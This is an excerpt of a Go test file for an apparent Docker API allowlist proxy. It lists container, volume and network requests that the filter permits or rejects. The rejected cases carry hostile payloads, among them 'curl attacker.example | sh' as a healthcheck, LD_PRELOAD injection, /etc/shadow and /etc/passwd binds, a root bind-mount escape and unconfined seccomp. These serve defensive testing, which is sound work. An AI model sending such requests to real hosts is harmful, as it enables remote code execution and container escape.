...
func TestAllowedCalls(t *testing.T) {
	...
	cases := []struct {
		...
		{"container create, chown-helper override, unbound-state path", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","Entrypoint":["/usr/bin/chown"],"Cmd":["--recursive","100:101","/var/lib/unbound"],"User":"0:0","HostConfig":{"NetworkMode":"none","CapAdd":["CHOWN"],"Binds":["rootguard-unbound-state:/var/lib/unbound"]}}`},
		{"container create with compose-managed networking config", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-core","HostConfig":{},"NetworkingConfig":{"EndpointsConfig":{"rootguard_control":{"Aliases":["core"]}}}}`},
		{"container create, core's own self-referential compose-file bind", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-core","HostConfig":{"Binds":["/opt/rootguard/compose.release.yaml:/opt/rootguard/compose.yaml:ro"]}}`},
		{"container create, updater's own self-referential compose-file bind", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-updater","HostConfig":{"Binds":["/opt/rootguard/compose.release.yaml:/opt/rootguard/compose.release.yaml:ro"]}}`},
		{"attach without stdin", "POST", "/containers/abc/attach?stdout=1&stderr=1&stream=1", ""},
		{"attach with an explicit falsy stdin", "POST", "/containers/abc/attach?stdin=false&stdout=1", ""},
		...
		{"network connect with a fixed IPv4 address", "POST", "/networks/rootguard-dns/connect",
			`{"Container":"rootguard-core","EndpointConfig":{"IPAMConfig":{"IPv4Address":"172.20.0.5"}}}`},
		...
		{"volumes create", "POST", "/volumes/create", `{"Name":"rootguard-data","Driver":"local"}`},
		{"volume remove, orphaned cleanup-labeled volume", "DELETE", "/volumes/rootguard-data-old-a1b2c3", ""},
		{"container create with a known healthcheck override", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-webapp","HostConfig":{},"Healthcheck":{"Test":["CMD","/app/rootguard-webapp","-healthcheck"]}}`},
		{"container create with known env and no-new-privileges", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-core","Env":["PORT=8081","ROOTGUARD_WEB_PORT=8080"],"HostConfig":{"SecurityOpt":["no-new-privileges:true"]}}`},
...
func TestRejectedCalls(t *testing.T) {
	cases := []struct {
		...
		{"container create, arbitrary entrypoint/cmd on an allowed image", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","Entrypoint":["sh","-c"],"Cmd":["cat /rootguard-adguard-config/AdGuardHome.yaml"],"HostConfig":{"Binds":["rootguard-adguard-config:/rootguard-adguard-config"]}}`},
		{"container create, chown-helper entrypoint with an unknown target path", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","Entrypoint":["/usr/bin/chown"],"Cmd":["--recursive","100:101","/etc/shadow"],"User":"0:0","HostConfig":{}}`},
		{"container create, known entrypoint with an unexpected user", "POST", "/containers/create",
			`{"Image":"sha256:` + strings.Repeat("a", 64) + `","Entrypoint":["true"],"User":"root","HostConfig":{}}`},
		{"container create with an unknown networking-config network", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-core","HostConfig":{},"NetworkingConfig":{"EndpointsConfig":{"attacker-network":{}}}}`},
		...
		{"compose-file bind, wrong target path", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-core","HostConfig":{"Binds":["/opt/rootguard/compose.release.yaml:/etc/passwd:ro"]}}`},
		{"compose-file bind, writable instead of read-only", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-core","HostConfig":{"Binds":["/opt/rootguard/compose.release.yaml:/opt/rootguard/compose.yaml"]}}`},
		{"compose-file bind, source filename doesn't match", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-core","HostConfig":{"Binds":["/opt/rootguard/not-the-real-compose.yaml:/opt/rootguard/compose.yaml:ro"]}}`},
		{"compose-file bind, source filename suffix trick", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-core","HostConfig":{"Binds":["/etc/shadowcompose.release.yaml:/opt/rootguard/compose.yaml:ro"]}}`},
		...
		{"device request (gpu passthrough)", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"DeviceRequests":[{"Driver":"nvidia","Count":-1}]}}`},
		{"unconfined seccomp", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"SecurityOpt":["seccomp=unconfined"]}}`},
		{"unconfined apparmor", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"SecurityOpt":["apparmor=unconfined"]}}`},
		{"malformed json", "POST", "/containers/create", `not json`},
		{"container create, LD_PRELOAD injection", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-core","Env":["LD_PRELOAD=/tmp/evil.so"],"HostConfig":{}}`},
		{"container create, LD_PRELOAD injection, lowercase key", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-core","Env":["ld_preload=/tmp/evil.so"],"HostConfig":{}}`},
		{"container create, arbitrary healthcheck (recurring RCE)", "POST", "/containers/create",
			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{},"Healthcheck":{"Test":["CMD-SHELL","curl attacker.example | sh"]}}`},

		{"volume create with an unknown name", "POST", "/volumes/create",
			`{"Name":"attacker-volume","Driver":"local"}`},
		{"volume create, bind-mount-as-volume escape", "POST", "/volumes/create",
			`{"Name":"rootguard-data","Driver":"local","DriverOpts":{"type":"none","o":"bind","device":"/"}}`},
		{"volume create with a non-local driver", "POST", "/volumes/create",
			`{"Name":"rootguard-data","Driver":"nfs"}`},
		{"volume create, malformed json", "POST", "/volumes/create", ""},
		{"volume remove, protected named volume", "DELETE", "/volumes/rootguard-data", ""},
		{"volume remove, protected session volume", "DELETE", "/volumes/rootguard-sessions", ""},
		...
		{"exec create, privileged", "POST", "/containers/rootguard-blockpage/exec",
			`{"Cmd":["nginx","-s","reload"],"Privileged":true}`},
		{"exec create, user override", "POST", "/containers/rootguard-blockpage/exec",
			`{"Cmd":["nginx","-s","reload"],"User":"root"}`},
		{"exec create, attach stdin", "POST", "/containers/rootguard-blockpage/exec",
			`{"Cmd":["nginx","-s","reload"],"AttachStdin":true}`},
		{"exec create, env override", "POST", "/containers/rootguard-blockpage/exec",
			`{"Cmd":["nginx","-s","reload"],"Env":["LD_PRELOAD=/tmp/evil.so"]}`},
		...
		{"connect with an alias", "POST", "/networks/rootguard-dns/connect",
			`{"Container":"rootguard-core","EndpointConfig":{"Aliases":["rootguard-adguard"]}}`},
		{"connect with a MAC address", "POST", "/networks/rootguard-dns/connect",
			`{"Container":"rootguard-core","EndpointConfig":{"MacAddress":"02:42:ac:11:00:02"}}`},
		{"connect with an IPv6 address", "POST", "/networks/rootguard-dns/connect",
			`{"Container":"rootguard-core","EndpointConfig":{"IPAMConfig":{"IPv6Address":"fd00::1"}}}`},
		{"connect with a malformed IPv4 address", "POST", "/networks/rootguard-dns/connect",
			`{"Container":"rootguard-core","EndpointConfig":{"IPAMConfig":{"IPv4Address":"not-an-ip"}}}`},
